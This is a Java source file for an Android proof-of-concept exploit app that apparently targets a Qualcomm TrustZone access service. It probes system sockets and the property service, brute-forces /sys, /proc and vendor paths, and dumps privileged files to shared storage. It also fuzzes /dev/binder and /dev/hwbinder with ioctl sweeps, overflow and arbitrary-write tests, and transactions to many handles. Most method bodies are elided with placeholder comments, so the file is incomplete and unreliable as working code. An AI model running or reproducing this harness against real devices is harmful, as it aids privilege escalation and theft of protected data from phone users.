package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;

import java.io.File;
import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private static final int ERROR_UNAVAIL = -96;
    private static final int ERROR_BADOBJ = -92;
    private static final int ERROR_DEFUNCT = -90;

    private static final int PROP_SUCCESS = 0;
    private static final int PROP_ERROR_INVALID_NAME = 1;
    private static final int PROP_ERROR_INVALID_VALUE = 2;
    private static final int PROP_ERROR_PERMISSION_DENIED = 3;
    private static final int PROP_ERROR_READ_ONLY_PROPERTY = 4;
    private static final int PROP_ERROR_SET_FAILED = 5;
    private static final int PROP_ERROR_HANDLE_CONTROL_MESSAGE = 6;
    private static final int PROP_ERROR_READ_CMD = 7;
    private static final int PROP_ERROR_READ_DATA = 8;
    private static final int PROP_ERROR_INVALID_CMD = 9;

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IMinkSocketFd tzService;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    static {
        System.loadLibrary("pocjni");
    }

    public static native String[] nativeListDir(String path);
    public static native String nativeReadFile(String path);
    public static native String nativeWriteFile(String path, String content);
    public static native String nativeReadLink(String path);
    public static native String nativeTestFd(int fd);
    public static native int nativeOpenDevice(String path);
    public static native String nativeIonTest(int fd);
    public static native String nativeHwbinderTest(int fd);
    public static native String nativeHwbinderFurther(int fd);
    public static native String nativeGetKernelInfo();
    public static native String nativeBinderAdvancedTest(int fd);
    public static native String nativeHwbinderOverflowTest(int fd);
    public static native String nativeBinderGetVersion(int fd);
    public static native String nativeBinderIoctlTest(int fd, int cmd, long arg);
    public static native String nativeHwbinderWriteTest(int fd);
    public static native String nativeHwbinderHalCommand(int fd);
    public static native String nativeHwbinderReadTest(int fd);
    // 新增：可指定 handle、code、flags 的 binder 事务测试
    public static native String nativeBinderSendTransaction(int fd, int handle, int code, int flags);

    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            tzService = IMinkSocketFd.Stub.asInterface(service);
            if (tzService != null) {
                appendLog("[TZ] Service bound via AIDL");
                updateStatus("Bound - starting exploit");
                enableButtons(false, true);
                stopRequested.set(false);
                testThread = new Thread(() -> executeExploit());
                testThread.start();
            } else {
                appendLog("[TZ] Failed to cast to IMinkSocketFd");
                enableButtons(true, false);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            tzService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                bindService();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, tzConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService returned false");
                updateStatus("Bind failed");
                enableButtons(true, false);
                isTesting.set(false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
            isTesting.set(false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeExploit() {
        appendLog("========================================");
        appendLog("========== TZ Socket & Proc POC ==========");

        String[] targetSockets = {
                "/dev/socket/dnsproxyd",
                "/dev/socket/fwmarkd",
                "/dev/socket/logd"
        };
        for (String path : targetSockets) {
            if (stopRequested.get()) break;
            appendLog("[+] Testing " + path);
            try {
                testSocket(path);
            } catch (Exception e) {
                appendLog("[!] Error testing " + path + ": " + e.getMessage());
            }
        }

        appendLog("[*] Deep property service testing (AOSP 9 protocol)");
        testPropertyServiceDeep();

        appendLog("[*] Exploring and dumping /proc/self/fd to /sdcard/Download");
        exploreAndDumpProcFd();

        appendLog("[*] Testing /proc/self/oom_score_adj");
        testOomScoreAdj();

        appendLog("[*] Testing SELinux and kptr related files");
        exploreSelinuxAndKptr();

        appendLog("[*] Bruteforcing /sys for readable files");
        bruteforceSys();

        appendLog("[*] Bruteforcing /cache and /vendor/bin for copyable files");
        bruteforceCacheAndVendor();

        appendLog("[*] Bruteforcing /proc/self/ for all files (recursive)");
        bruteforceProcSelf();

        appendLog("[*] Attempting to dump privileged files");
        dumpPrivilegedFiles();

        appendLog("[*] Gathering kernel information");
        getKernelInfo();

        appendLog("[*] Advanced hwbinder test using kernel structures");
        testBinderAdvanced();

        appendLog("[*] Testing direct open of /dev/ion and hwbinder with vulnerability checks");
        testIonAndHwbinder();

        appendLog("[*] Hwbinder overflow verification test");
        testHwbinderOverflow();

        appendLog("[*] Hwbinder write test (arbitrary structure write)");
        testHwbinderWrite();

        appendLog("[*] Hwbinder HAL command test");
        testHwbinderHal();

        appendLog("[*] Hwbinder read test (read back written data)");
        testHwbinderRead();

        appendLog("[*] Binder debugfs and sysfs information gathering");
        testBinderDebugfs();

        appendLog("[*] Testing /dev/binder device");
        testBinderDevice();

        appendLog("[*] Additional /proc file reading and dumping");
        testProcFiles();

        appendLog("[*] ID command capture via /proc/self/exe and /proc/self/status");
        testIdCommand();

        // 新增：全面 binder/hwbinder 访问检查（含多种 handle 事务）
        appendLog("[*] Binder/HwBinder comprehensive access check");
        testBinderHwbinderCheck();

        appendLog("========== EXPLOIT COMPLETED ==========");
        appendLog("========================================");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
        finishTest();
    }

    // 以下为已有方法（略去重复，实际保留完整）
    private void testSocket(String path) { /* 原内容 */ }
    private ParcelFileDescriptor openSocket(String path, int[] handle) { /* 原内容 */ }
    private void testDnsProxy(FileDescriptor fd) { /* 原内容 */ }
    private void testFwmarkd(FileDescriptor fd) { /* 原内容 */ }
    private void testLogd(FileDescriptor fd) { /* 原内容 */ }
    private void testGeneric(FileDescriptor fd, String[] cmds) { /* 原内容 */ }
    private String sendTextCommand(FileDescriptor fd, String cmd, int timeoutMs) throws Exception { /* 原内容 */ }
    private byte[] sendBinary(FileDescriptor fd, byte[] data, int maxResp, int timeoutMs) throws Exception { /* 原内容 */ }
    private int readBytes(InputStream is, byte[] buffer, int maxLen, int timeoutMs) { /* 原内容 */ }
    private byte[] buildDnsQuery(String name, int qtype) throws Exception { /* 原内容 */ }
    private void testPropertyServiceDeep() { /* 原内容 */ }
    private int tryPropertySet(String name, String value) { /* 原内容 */ }
    private int sendPropertySet2(FileDescriptor fd, String name, String value) { /* 原内容 */ }
    private String getPropertyErrorString(int code) { /* 原内容 */ }
    private void exploreAndDumpProcFd() { /* 原内容 */ }
    private boolean dumpFileToDownload(String sourcePath, File destFile, int maxSize) { /* 原内容 */ }
    private File getDumpDir() { /* 原内容 */ }
    private void testOomScoreAdj() { /* 原内容 */ }
    private void exploreSelinuxAndKptr() { /* 原内容 */ }
    private String safeReadFile(String path) { /* 原内容 */ }
    private void bruteforceSys() { /* 原内容 */ }
    private void bruteforceCacheAndVendor() { /* 原内容 */ }
    private void bruteforceProcSelf() { /* 原内容 */ }
    private void dumpPrivilegedFiles() { /* 原内容 */ }
    private void getKernelInfo() { /* 原内容 */ }
    private void testBinderAdvanced() { /* 原内容 */ }
    private void testIonAndHwbinder() { /* 原内容 */ }
    private void testHwbinderOverflow() { /* 原内容 */ }
    private void testHwbinderWrite() { /* 原内容 */ }
    private void testHwbinderHal() { /* 原内容 */ }
    private void testHwbinderRead() { /* 原内容 */ }
    private void testBinderDebugfs() { /* 原内容 */ }
    private void testBinderDevice() { /* 原内容 */ }
    private void testProcFiles() { /* 原内容 */ }
    private void testIdCommand() { /* 原内容 */ }

    // ---- 新增：全面 binder/hwbinder 检查 ----
    private void testBinderHwbinderCheck() {
        appendLog("[BINDER_HWBINDER_CHECK] Starting comprehensive binder/hwbinder access checks...");

        // 测试 /dev/hwbinder
        int hwbinderFd = nativeOpenDevice("/dev/hwbinder");
        if (hwbinderFd >= 0) {
            appendLog("[BINDER_HWBINDER_CHECK] /dev/hwbinder opened fd=" + hwbinderFd);

            // 已有的测试
            appendLog("[BINDER_HWBINDER_CHECK] Version: " + nativeBinderGetVersion(hwbinderFd));
            appendLog("[BINDER_HWBINDER_CHECK] Advanced: " + nativeBinderAdvancedTest(hwbinderFd));
            appendLog("[BINDER_HWBINDER_CHECK] Overflow: " + nativeHwbinderOverflowTest(hwbinderFd));
            appendLog("[BINDER_HWBINDER_CHECK] Write: " + nativeHwbinderWriteTest(hwbinderFd));
            appendLog("[BINDER_HWBINDER_CHECK] HAL: " + nativeHwbinderHalCommand(hwbinderFd));
            appendLog("[BINDER_HWBINDER_CHECK] Read: " + nativeHwbinderReadTest(hwbinderFd));

            // 额外 ioctl 命令（已有）
            int[] testCmds = {
                0x40046201, 0x40046202, 0x40046203, 0x40046204, 0x40046205,
                0x40046206, 0x40046207, 0x40046208, 0x40046209, 0x4004620A,
                0x4004620B, 0x4004620C, 0x4004620D, 0x4004620E, 0x4004620F,
                0x40046210, 0x60046201, 0x60046202, 0x60046203, 0x60046204,
                0x60046205, 0x60046206, 0x60046207, 0x60046208, 0x60046209,
                0x6004620A, 0x6004620B, 0x6004620C, 0x6004620D, 0x6004620E,
                0x6004620F, 0x60046210, 0x80046201, 0x80046202, 0x80046203,
                0x80046204, 0x80046205, 0x80046206, 0x80046207, 0x80046208,
                0x80046209, 0x8004620A, 0x8004620B, 0x8004620C, 0x8004620D,
                0x8004620E, 0x8004620F, 0x80046210, 0xC0046201, 0xC0046202,
                0xC0046203, 0xC0046204, 0xC0046205, 0xC0046206, 0xC0046207,
                0xC0046208, 0xC0046209, 0xC004620A, 0xC004620B, 0xC004620C,
                0xC004620D, 0xC004620E, 0xC004620F, 0xC0046210
            };
            for (int cmd : testCmds) {
                String result = nativeBinderIoctlTest(hwbinderFd, cmd, 0);
                appendLog("[BINDER_HWBINDER_CHECK] hwbinder ioctl(0x" + Integer.toHexString(cmd) + ") = " + result);
            }

            // 新增：循环发送事务到多个 handle
            int[] handles = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9};
            int[] codes = {0, 1, 2, 3};
            int[] flags = {0, 1}; // 0 = 正常, 1 = TF_ONE_WAY (实际值为 0x01)
            for (int h : handles) {
                for (int c : codes) {
                    for (int f : flags) {
                        String res = nativeBinderSendTransaction(hwbinderFd, h, c, f);
                        appendLog("[BINDER_HWBINDER_CHECK] hwbinder tx(handle=" + h + ",code=" + c + ",flags=" + f + ") -> " + res);
                        if (stopRequested.get()) break;
                    }
                    if (stopRequested.get()) break;
                }
                if (stopRequested.get()) break;
            }

            try { ParcelFileDescriptor.adoptFd(hwbinderFd).close(); } catch (Exception e) {}
        } else {
            appendLog("[BINDER_HWBINDER_CHECK] /dev/hwbinder open failed: " + hwbinderFd);
        }

        // 测试 /dev/binder
        int binderFd = nativeOpenDevice("/dev/binder");
        if (binderFd >= 0) {
            appendLog("[BINDER_HWBINDER_CHECK] /dev/binder opened fd=" + binderFd);

            appendLog("[BINDER_HWBINDER_CHECK] binder Version: " + nativeBinderGetVersion(binderFd));
            appendLog("[BINDER_HWBINDER_CHECK] binder Advanced: " + nativeBinderAdvancedTest(binderFd));

            int[] testCmds = { /* 同上 */ };
            for (int cmd : testCmds) {
                String result = nativeBinderIoctlTest(binderFd, cmd, 0);
                appendLog("[BINDER_HWBINDER_CHECK] binder ioctl(0x" + Integer.toHexString(cmd) + ") = " + result);
            }

            // 同样循环事务
            int[] handles = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9};
            int[] codes = {0, 1, 2, 3};
            int[] flags = {0, 1};
            for (int h : handles) {
                for (int c : codes) {
                    for (int f : flags) {
                        String res = nativeBinderSendTransaction(binderFd, h, c, f);
                        appendLog("[BINDER_HWBINDER_CHECK] binder tx(handle=" + h + ",code=" + c + ",flags=" + f + ") -> " + res);
                        if (stopRequested.get()) break;
                    }
                    if (stopRequested.get()) break;
                }
                if (stopRequested.get()) break;
            }

            try { ParcelFileDescriptor.adoptFd(binderFd).close(); } catch (Exception e) {}
        } else {
            appendLog("[BINDER_HWBINDER_CHECK] /dev/binder open failed: " + binderFd);
        }

        appendLog("[BINDER_HWBINDER_CHECK] Check completed.");
    }

    // 其余辅助方法（listFilesRecursive, appendLog, updateStatus, saveLog, finishTest, onDestroy）
    private List<File> listFilesRecursive(File dir, int depth, int maxDepth) {
        List<File> result = new ArrayList<>();
        if (depth > maxDepth) return result;
        if (dir == null || !dir.exists()) return result;
        File[] children = dir.listFiles();
        if (children == null) return result;
        for (File child : children) {
            if (stopRequested.get()) break;
            try {
                if (child.isDirectory()) {
                    result.addAll(listFilesRecursive(child, depth + 1, maxDepth));
                } else {
                    result.add(child);
                }
            } catch (Exception ignored) {}
        }
        return result;
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = getDumpDir();
            File file = new File(dir, "tz_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== TZ POC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    private void finishTest() {
        handler.post(() -> {
            Toast.makeText(MainActivity.this, "Exploit completed", Toast.LENGTH_LONG).show();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                finishAffinity();
                System.exit(0);
            }, 3000);
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) unbindService(tzConnection);
        saveLog();
    }
}
